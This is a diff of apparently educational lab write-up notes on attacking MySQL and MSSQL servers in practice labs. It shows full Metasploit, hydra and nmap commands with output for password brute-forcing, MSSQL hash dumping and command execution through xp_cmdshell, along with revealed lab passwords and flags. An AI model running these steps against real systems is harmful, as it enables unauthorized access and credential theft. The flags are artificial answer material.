@@ -291,14 +291,13 @@ MySQL [(none)]> select load_file("/etc/shadow");
 # /etc/shadow is readable
 ```
 
-![select load_file("/etc/shadow");](.gitbook/assets/image-20230219162415428.png)
-
 <details>
 <summary>Reveal Flag - System password hash for user “root” is: 🚩</summary>
 
 
-
 `S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`
+
+![select load_file("/etc/shadow");](.gitbook/assets/image-20230219162415428.png)
 
 </details>
 
@@ -516,83 +515,365 @@ nmap --script=mysql-query --script-args="query='select count(*) from books.autho
 >  🔬 [MySQL Recon: Dictionary Attack](https://attackdefense.pentesteracademy.com/challengedetails?cid=532)
 >
 >  - Target IP: `10.4.16.17`
->  - `MySQL` server disctionary attack.
+>  - `MySQL` server dictionary attack.
 
 ```bash
-nmap 
+ip -br -c a
+	eth1@if176858   UP   192.222.16.2/24 
+nmap 192.222.16.3
 ```
 
 ```bash
-nmap -sV -p3306
+nmap -sV -p3306 192.222.16.3
+	3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
 ```
 
-> 📌 
+### Metasploit
 
+- Use the [`mysql_login`](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/) metasploit module to bruteforce user login.
 
+```bash
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/mysql/mysql_login 
+set RHOSTS 192.222.16.3
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS true
+exploit
+
+[+] 192.222.16.3:3306     - 192.222.16.3:3306 - Success: 'root:catalina'
+[*] 192.222.16.3:3306     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+### Hydra
+
+- Use `hydra` tool with the same metasploit `unix_passwords` list to bruteforce root login.
+
+```bash
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mysql
+```
+
+```bash
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
+[DATA] attacking mysql://192.222.16.3:3306/
+[3306][mysql] host: 192.222.16.3   login: root   password: catalina
+1 of 1 target successfully completed, 1 valid password found
+```
 
 <details>
-<summary>Reveal Flag: 🚩</summary>
+<summary>Reveal Flag - MySQL server "root" password is: 🚩</summary>
 
 
 
-``
+`catalina`
+
+![Metasploit - mysql_login](.gitbook/assets/image-20230219182624753.png)
 
 </details>
-
-
-
-
-
-
-
-
-
-<!---
 
 ## Lab 3
 
 >  🔬 [Recon: MSSQL: Nmap Scripts](https://attackdefense.pentesteracademy.com/challengedetails?cid=2313)
 >
->  - Target IP: `10.4.16.17`
->  - `MySQL` server reconnaisance.
+>  - Target IP: `10.4.21.27`
+>  - `Windows MSSQL` server enumeration with `nmap`
 
 ```bash
-nmap 
+nmap 10.4.21.27
+    135/tcp  open  msrpc
+    139/tcp  open  netbios-ssn
+    445/tcp  open  microsoft-ds
+    1433/tcp open  ms-sql-s
+    3389/tcp open  ms-wbt-server
 ```
 
 ```bash
-nmap -sV -O 
+nmap -sV -sC -p1433 10.4.21.27
 ```
 
+```bash
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: MSSQL-SERVER
+|   NetBIOS_Domain_Name: MSSQL-SERVER
+|   NetBIOS_Computer_Name: MSSQL-SERVER
+|   DNS_Domain_Name: MSSQL-Server
+|   DNS_Computer_Name: MSSQL-Server
+|_  Product_Version: 10.0.14393
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2023-02-19T17:36:09
+|_Not valid after:  2053-02-19T17:36:09
+|_ssl-date: 2023-02-19T17:41:06+00:00; -1s from scanner time.
+
+Host script results:
+| ms-sql-info: 
+|   10.4.21.27:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+```
+
+![nmap scan](.gitbook/assets/image-20230219184629810.png)
+
+- *Sending a MS-TDS NTLM authentication request with an invalid domain and null credentials will cause the remote service to respond with a NTLMSSP message disclosing information to include NetBIOS, DNS, and OS build version.*
+- For above default scripts, `nmap --script` command option can also be used:
+
+```bash
+nmap --script ms-sql-info -p1433 10.4.21.27
+```
+
+```bash
+nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27
+```
+
+> 📌 Server is `Microsoft SQL Server 2019`
+
+- Enumerate MSSQL users and password.
+
+```bash
+nmap --script ms-sql-brute --script-args= userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27
+```
+
+```bash
+1433/tcp open  ms-sql-s
+| ms-sql-brute: 
+|   [10.4.21.27:1433]
+|     Credentials found:
+|       dbadmin:bubbles1 => Login Success
+|       admin:anamaria => Login Success
+|_      auditor:jasmine1 => Login Success
+```
+
+![nmap ms-sql-brute](.gitbook/assets/image-20230219191658970.png)
+
+> 📌 Valid MSSQL users and passwords are:
+>
+> `dbadmin:bubbles1`
+> `admin:anamaria`
+> `auditor:jasmine1`
+
+- Check empty password users.
+
+```bash
+nmap --script ms-sql-empty-password -p1433 10.4.21.27
+```
+
+> 📌 ***sa*** user is enabled with `empty password`.
+
+- Extract *sysusers* from MSSQL and store the output in a file
+
+```bash
+nmap --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -p1433 10.4.21.27 -oN output.txt
+```
+
+![nmap ms-sql-query](.gitbook/assets/image-20230219192121059.png)
+
+- Dump MSSQL users hashes
+
+```bash
+nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27
+```
+
+![nmap ms-sql-dump-hashes](.gitbook/assets/image-20230219192459540.png)
+
+> 📌 ***MSSQL*** users hashes are:
+>
+> `sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0`
+> `##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c`
+> `##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083`
+> `admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0`
+> `Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4`
+> `Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5`
+> `auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e`
+> `dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b` 
+
+- Execute a command using [`ms-sql-xp-cmdshell`](https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html) nmap script.
+  - [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) *spawns a Windows command shell and passes in a string for execution*
+
+```bash
+nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27
+```
+
+![nmap ms-sql-xp-cmdshell](.gitbook/assets/image-20230219192841055.png)
+
+```bash
+nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27
+
+# MSSQL service is configured with xp_cmdshell enabled (no by default)
+```
+
+<details>
+<summary>Reveal Flag: 🚩</summary>
 
 
+`1d1803570245aa620446518b2154f324`
 
+![](.gitbook/assets/image-20230219193057071.png)
 
-
-
-
-
-
-
+</details>
 
 
 ## Lab 4
 
 >  🔬 [Recon: MSSQL: Metasploit](https://attackdefense.pentesteracademy.com/challengedetails?cid=2314)
 >
->  - Target IP: `10.4.16.17`
->  - `MySQL` server reconnaisance.
+>  - Target IP: `10.4.23.176`
+>  - `Windows MSSQL` server enumeration with `metasploit`
 
 ```bash
-nmap 
+nmap 10.4.23.176
+    53/tcp   open  domain
+    88/tcp   open  kerberos-sec
+    135/tcp  open  msrpc
+    139/tcp  open  netbios-ssn
+    389/tcp  open  ldap
+    445/tcp  open  microsoft-ds
+    464/tcp  open  kpasswd5
+    593/tcp  open  http-rpc-epmap
+    636/tcp  open  ldapssl
+    1433/tcp open  ms-sql-s
+    3268/tcp open  globalcatLDAP
+    3269/tcp open  globalcatLDAPssl
+    3389/tcp open  ms-wbt-server
 ```
 
 ```bash
-nmap -sV -O 
+nmap --script ms-sql-info -p1433 10.4.23.176
+
+Host script results:
+| ms-sql-info: 
+|   10.4.23.176:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
 ```
 
+> 📌 Server is `Microsoft SQL Server 2019`
 
--->
+- User Metasploit to enumerate MSSQL configuration, logins, users and execute a command on the target machine.
+
+```bash
+msfconsole -q
+```
+
+```bash
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 10.4.23.176
+set USER_FILE /root/Desktop/wordlist/common_users.txt
+set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+set VERBOSE false
+exploit
+
+[*] 10.4.23.176:1433      - 10.4.23.176:1433 - MSSQL - Starting authentication scanner.
+[+] 10.4.23.176:1433      - 10.4.23.176:1433 - Login Successful: WORKSTATION\sa:
+[+] 10.4.23.176:1433      - 10.4.23.176:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
+[+] 10.4.23.176:1433      - 10.4.23.176:1433 - Login Successful: WORKSTATION\auditor:nikita
+```
+
+![Metasploit - mssql_login](.gitbook/assets/image-20230219193931380.png)
+
+> 📌 **`sa`** user has `empty password`.
 
 
+
+<details>
+<summary>Reveal Flag - other users and passwords are: 🚩</summary>
+
+
+
+`dbadmin:anamaria`
+
+`auditor:nikita`
+
+</details>
+
+
+
+```bash
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS 10.4.23.176
+exploit
+```
+
+![Metasploit - mssql_enum](.gitbook/assets/image-20230219194339939.png)
+
+![](.gitbook/assets/image-20230219194421628.png)
+
+![](.gitbook/assets/image-20230219194438863.png)
+
+```bash
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+set RHOSTS 10.4.23.176
+exploit
+
+[*] 10.4.23.176:1433 - Attempting to connect to the database server at 10.4.23.176:1433 as sa...
+[+] 10.4.23.176:1433 - Connected.
+[*] 10.4.23.176:1433 - Checking if sa has the sysadmin role...
+[+] 10.4.23.176:1433 - sa is a sysadmin.
+[*] 10.4.23.176:1433 - Setup to fuzz 300 SQL Server logins.
+[*] 10.4.23.176:1433 - Enumerating logins...
+[+] 10.4.23.176:1433 - 38 initial SQL Server logins were found.
+[*] 10.4.23.176:1433 - Verifying the SQL Server logins...
+[+] 10.4.23.176:1433 - 16 SQL Server logins were verified:
+[*] 10.4.23.176:1433 -  - ##MS_PolicyEventProcessingLogin##
+[*] 10.4.23.176:1433 -  - ##MS_PolicyTsqlExecutionLogin##
+[*] 10.4.23.176:1433 -  - ##MS_SQLAuthenticatorCertificate##
+[*] 10.4.23.176:1433 -  - ##MS_SQLReplicationSigningCertificate##
+[*] 10.4.23.176:1433 -  - ##MS_SQLResourceSigningCertificate##
+[*] 10.4.23.176:1433 -  - BUILTIN\Users
+[*] 10.4.23.176:1433 -  - EC2AMAZ-5861GL6\Administrator
+[*] 10.4.23.176:1433 -  - NT AUTHORITY\SYSTEM
+[*] 10.4.23.176:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
+[*] 10.4.23.176:1433 -  - NT SERVICE\SQLWriter
+[*] 10.4.23.176:1433 -  - NT SERVICE\Winmgmt
+[*] 10.4.23.176:1433 -  - NT Service\MSSQL$SQLEXPRESS
+[*] 10.4.23.176:1433 -  - admin
+[*] 10.4.23.176:1433 -  - auditor
+[*] 10.4.23.176:1433 -  - dbadmin
+[*] 10.4.23.176:1433 -  - sa
+[*] Auxiliary module execution completed
+```
+
+![Metasploit - mssql_enum_sql_logins](.gitbook/assets/image-20230219194537158.png)
+
+```bash
+use auxiliary/admin/mssql/mssql_exec
+set RHOSTS 10.4.23.176
+set CMD whoami
+exploit
+
+[*] Running module against 10.4.23.176
+[*] 10.4.23.176:1433 - SQL Query: EXEC master..xp_cmdshell 'whoami'
+ output
+ ------
+ nt service\mssql$sqlexpress
+[*] Auxiliary module execution completed
+```
+
+![Metasploit - mssql_exec](.gitbook/assets/image-20230219194926288.png)
+
+```bash
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS 10.4.23.176
+exploit
+```
+
+![Metasploit - mssql_enum_domain_accounts](.gitbook/assets/image-20230219195109764.png)
+
+------
 
